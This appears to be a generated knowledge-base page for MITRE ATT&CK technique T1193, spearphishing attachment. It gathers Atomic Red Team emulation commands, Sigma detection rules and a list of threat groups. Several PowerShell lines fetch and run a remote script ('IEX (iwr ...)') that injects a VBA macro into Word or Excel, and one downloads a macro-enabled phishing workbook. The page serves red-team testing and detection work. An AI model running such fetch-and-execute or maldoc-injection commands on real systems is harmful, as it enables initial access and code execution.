
# Spearphishing Attachment

## Description

### MITRE Description

> Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Windows', 'macOS', 'Linux']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1193

## Potential Commands

```
if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
  return 'Please install Microsoft Excel before running this test.'
}
else{
  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
  $fileName = 'PhishingAttachment.xlsm'
  New-Item -Type File -Force -Path $fileName | out-null
  $wc = New-Object System.Net.WebClient
  $wc.Encoding = [System.Text.Encoding]::UTF8
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  ($wc.DownloadString("$url")) | Out-File $fileName
}

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"

```

## Commands Dataset

```
[{'command': 'if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n'
             "  return 'Please install Microsoft Excel before running this "
             "test.'\n"
             '}\n'
             'else{\n'
             '  $url = '
             "'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n"
             "  $fileName = 'PhishingAttachment.xlsm'\n"
             '  New-Item -Type File -Force -Path $fileName | out-null\n'
             '  $wc = New-Object System.Net.WebClient\n'
             '  $wc.Encoding = [System.Text.Encoding]::UTF8\n'
             '  [Net.ServicePointManager]::SecurityProtocol = '
             '[Net.SecurityProtocolType]::Tls12\n'
             '  ($wc.DownloadString("$url")) | Out-File $fileName\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1193/T1193.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping '
             '8.8.8.8`"`n"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1193/T1193.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping '
             '8.8.8.8`"`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1193/T1193.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output '
             'As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ '
             '`"ping 8.8.8.8`"`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" '
             '"#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1193/T1193.yaml'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/10/24',
                  'description': 'Detects suspicious Hangul Word Processor '
                                 '(Hanword) sub processes that could indicate '
                                 'an exploitation',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': '*\\gbb.exe',
                                              'ParentImage': '*\\Hwp.exe'}},
                  'falsepositives': ['Unknown'],
                  'id': '023394c4-29d5-46ab-92b8-6a534c6f447b',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/',
                                 'https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1',
                                 'https://twitter.com/cyberwar_15/status/1187287262054076416',
                                 'https://blog.alyac.co.kr/1901',
                                 'https://en.wikipedia.org/wiki/Hangul_(word_processor)'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.defense_evasion',
                           'attack.initial_access',
                           'attack.t1059',
                           'attack.t1202',
                           'attack.t1193',
                           'attack.g0032'],
                  'title': 'Suspicious HWP Sub Processes'}},
 {'data_source': {'author': 'Florian Roth (rule), @blu3_team (idea)',
                  'date': '2019/06/26',
                  'description': 'Detects suspicious use of an .exe extension '
                                 'after a non-executable file extension like '
                                 '.pdf.exe, a set of spaces or underlines to '
                                 'cloak the executable file in spear phishing '
                                 'campaigns',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': ['*.doc.exe',
                                                        '*.docx.exe',
                                                        '*.xls.exe',
                                                        '*.xlsx.exe',
                                                        '*.ppt.exe',
                                                        '*.pptx.exe',
                                                        '*.rtf.exe',
                                                        '*.pdf.exe',
                                                        '*.txt.exe',
                                                        '*      .exe',
                                                        '*______.exe']}},
                  'falsepositives': ['Unknown'],
                  'id': '1cdd9a09-06c9-4769-99ff-626e2b3991b8',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html',
                                 'https://twitter.com/blackorbird/status/1140519090961825792'],
                  'tags': ['attack.initial_access', 'attack.t1193'],
                  'title': 'Suspicious Double Extension'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/10/01',
                  'description': 'Detects a suspicious program execution in '
                                 'Outlook temp folder',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': '*\\Temporary Internet '
                                                       'Files\\Content.Outlook\\\\*'}},
                  'falsepositives': ['Unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'a018fdc3-46a3-44e5-9afb-2cd4af1d4b39',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'status': 'experimental',
                  'tags': ['attack.initial_access', 'attack.t1193'],
                  'title': 'Execution in Outlook Temp Folder'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Mail server']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Detonation chamber']},
 {'data_source': ['Email gateway']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Mail server']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Detonation chamber']},
 {'data_source': ['Email gateway']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Spearphishing Attachment': {'atomic_tests': [{'auto_generated_guid': '114ccff9-ae6d-4547-9ead-4cd69f687306',
                                                                        'description': 'The '
                                                                                       'macro-enabled '
                                                                                       'Excel '
                                                                                       'file '
                                                                                       'contains '
                                                                                       'VBScript '
                                                                                       'which '
                                                                                       'opens '
                                                                                       'your '
                                                                                       'default '
                                                                                       'web '
                                                                                       'browser '
                                                                                       'and '
                                                                                       'opens '
                                                                                       'it '
                                                                                       'to '
                                                                                       '[google.com](http://google.com).\n'
                                                                                       'The '
                                                                                       'below '
                                                                                       'will '
                                                                                       'successfully '
                                                                                       'download '
                                                                                       'the '
                                                                                       'macro-enabled '
                                                                                       'Excel '
                                                                                       'file '
                                                                                       'to '
                                                                                       'the '
                                                                                       'current '
                                                                                       'location.\n',
                                                                        'executor': {'command': 'if '
                                                                                                '(-not(Test-Path '
                                                                                                'HKLM:SOFTWARE\\Classes\\Excel.Application)){\n'
                                                                                                '  '
                                                                                                'return '
                                                                                                "'Please "
                                                                                                'install '
                                                                                                'Microsoft '
                                                                                                'Excel '
                                                                                                'before '
                                                                                                'running '
                                                                                                'this '
                                                                                                "test.'\n"
                                                                                                '}\n'
                                                                                                'else{\n'
                                                                                                '  '
                                                                                                '$url '
                                                                                                '= '
                                                                                                "'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n"
                                                                                                '  '
                                                                                                '$fileName '
                                                                                                '= '
                                                                                                "'PhishingAttachment.xlsm'\n"
                                                                                                '  '
                                                                                                'New-Item '
                                                                                                '-Type '
                                                                                                'File '
                                                                                                '-Force '
                                                                                                '-Path '
                                                                                                '$fileName '
                                                                                                '| '
                                                                                                'out-null\n'
                                                                                                '  '
                                                                                                '$wc '
                                                                                                '= '
                                                                                                'New-Object '
                                                                                                'System.Net.WebClient\n'
                                                                                                '  '
                                                                                                '$wc.Encoding '
                                                                                                '= '
                                                                                                '[System.Text.Encoding]::UTF8\n'
                                                                                                '  '
                                                                                                '[Net.ServicePointManager]::SecurityProtocol '
                                                                                                '= '
                                                                                                '[Net.SecurityProtocolType]::Tls12\n'
                                                                                                '  '
                                                                                                '($wc.DownloadString("$url")) '
                                                                                                '| '
                                                                                                'Out-File '
                                                                                                '$fileName\n'
                                                                                                '}\n',
                                                                                     'elevation_required': False,
                                                                                     'name': 'powershell'},
                                                                        'name': 'Download '
                                                                                'Phishing '
                                                                                'Attachment '
                                                                                '- '
                                                                                'VBScript',
                                                                        'supported_platforms': ['windows']},
                                                                       {'auto_generated_guid': 'cbb6799a-425c-4f83-9194-5447a909d67f',
                                                                        'dependencies': [{'description': 'Test '
                                                                                                         'Requires '
                                                                                                         'MS '
                                                                                                         'Office '
                                                                                                         'to '
                                                                                                         'be '
                                                                                                         'installed '
                                                                                                         'and '
                                                                                                         'have '
                                                                                                         'been '
                                                                                                         'run '
                                                                                                         'previously. '
                                                                                                         'Run '
                                                                                                         '-GetPrereqs '
                                                                                                         'to '
                                                                                                         'run '
                                                                                                         'msword '
                                                                                                         'and '
                                                                                                         'build '
                                                                                                         'dependent '
                                                                                                         'registry '
                                                                                                         'keys\n',
                                                                                          'get_prereq_command': '$msword '
                                                                                                                '= '
                                                                                                                'New-Object '
                                                                                                                '-ComObject '
                                                                                                                'word.application\n'
                                                                                                                'Stop-Process '
                                                                                                                '-Name '
                                                                                                                'WINWORD\n',
                                                                                          'prereq_command': 'If '
                                                                                                            '(Test-Path '
                                                                                                            'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '0 '
                                                                                                            '} '
                                                                                                            'else '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '1 '
                                                                                                            '}\n'}],
                                                                        'dependency_executor_name': 'powershell',
                                                                        'description': 'Word '
                                                                                       'spawning '
                                                                                       'a '
                                                                                       'command '
                                                                                       'prompt '
                                                                                       'then '
                                                                                       'running '
                                                                                       'a '
                                                                                       'command '
                                                                                       'with '
                                                                                       'an '
                                                                                       'IP '
                                                                                       'address '
                                                                                       'in '
                                                                                       'the '
                                                                                       'command '
                                                                                       'line '
                                                                                       'is '
                                                                                       'an '
                                                                                       'indiciator '
                                                                                       'of '
                                                                                       'malicious '
                                                                                       'activity.\n'
                                                                                       'Upon '
                                                                                       'execution, '
                                                                                       'CMD '
                                                                                       'will '
                                                                                       'be '
                                                                                       'lauchned '
                                                                                       'and '
                                                                                       'ping '
                                                                                       '8.8.8.8\n',
                                                                        'executor': {'cleanup_command': 'if '
                                                                                                        '(Test-Path '
                                                                                                        '#{jse_path}) '
                                                                                                        '{ '
                                                                                                        'Remove-Item '
                                                                                                        '#{jse_path} '
                                                                                                        '}\n'
                                                                                                        'Remove-ItemProperty '
                                                                                                        '-Path '
                                                                                                        "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                                        '-Name '
                                                                                                        "'AccessVBOM' "
                                                                                                        '-ErrorAction '
                                                                                                        'Ignore\n',
                                                                                     'command': 'IEX '
                                                                                                '(iwr '
                                                                                                '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                                '$macrocode '
                                                                                                '= '
                                                                                                '"   '
                                                                                                'Open '
                                                                                                '`"#{jse_path}`" '
                                                                                                'For '
                                                                                                'Output '
                                                                                                'As '
                                                                                                '#1`n   '
                                                                                                'Write '
                                                                                                '#1, '
                                                                                                '`"WScript.Quit`"`n   '
                                                                                                'Close '
                                                                                                '#1`n   '
                                                                                                'Shell`$ '
                                                                                                '`"ping '
                                                                                                '8.8.8.8`"`n"\n'
                                                                                                'Invoke-MalDoc '
                                                                                                '$macrocode '
                                                                                                '"#{ms_office_version}" '
                                                                                                '"#{ms_product}"\n',
                                                                                     'elevation_required': False,
                                                                                     'name': 'powershell'},
                                                                        'input_arguments': {'jse_path': {'default': 'C:\\Users\\Public\\art.jse',
                                                                                                         'description': 'Path '
                                                                                                                        'for '
                                                                                                                        'the '
                                                                                                                        'macro '
                                                                                                                        'to '
                                                                                                                        'write '
                                                                                                                        'out '
                                                                                                                        'the '
                                                                                                                        '"malicious" '
                                                                                                                        '.jse '
                                                                                                                        'file\n',
                                                                                                         'type': 'String'},
                                                                                            'ms_office_version': {'default': '16.0',
                                                                                                                  'description': 'Microsoft '
                                                                                                                                 'Office '
                                                                                                                                 'version '
                                                                                                                                 'number '
                                                                                                                                 'found '
                                                                                                                                 'in '
                                                                                                                                 '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                                  'type': 'String'},
                                                                                            'ms_product': {'default': 'Word',
                                                                                                           'description': 'Maldoc '
                                                                                                                          'application '
                                                                                                                          'Word '
                                                                                                                          'or '
                                                                                                                          'Excel',
                                                                                                           'type': 'String'}},
                                                                        'name': 'Word '
                                                                                'spawned '
                                                                                'a '
                                                                                'command '
                                                                                'shell '
                                                                                'and '
                                                                                'used '
                                                                                'an '
                                                                                'IP '
                                                                                'address '
                                                                                'in '
                                                                                'the '
                                                                                'command '
                                                                                'line',
                                                                        'supported_platforms': ['windows']}],
                                                      'attack_technique': 'T1193',
                                                      'display_name': 'Spearphishing '
                                                                      'Attachment'}}]
```

# Tactics


* [Initial Access](../tactics/Initial-Access.md)


# Mitigations

None

# Actors


* [Gorgon Group](../actors/Gorgon-Group.md)

* [Rancor](../actors/Rancor.md)
    
* [FIN8](../actors/FIN8.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [DarkHydrus](../actors/DarkHydrus.md)
    
* [APT28](../actors/APT28.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [TA459](../actors/TA459.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [Elderwood](../actors/Elderwood.md)
    
* [APT29](../actors/APT29.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [APT37](../actors/APT37.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [OilRig](../actors/OilRig.md)
    
* [menuPass](../actors/menuPass.md)
    
* [APT19](../actors/APT19.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [FIN4](../actors/FIN4.md)
    
* [Turla](../actors/Turla.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [APT32](../actors/APT32.md)
    
* [APT39](../actors/APT39.md)
    
* [The White Company](../actors/The-White-Company.md)
    
* [Silence](../actors/Silence.md)
    
* [TA505](../actors/TA505.md)
    
* [APT12](../actors/APT12.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [admin@338](../actors/admin@338.md)
    
* [Machete](../actors/Machete.md)
    
* [APT41](../actors/APT41.md)
    
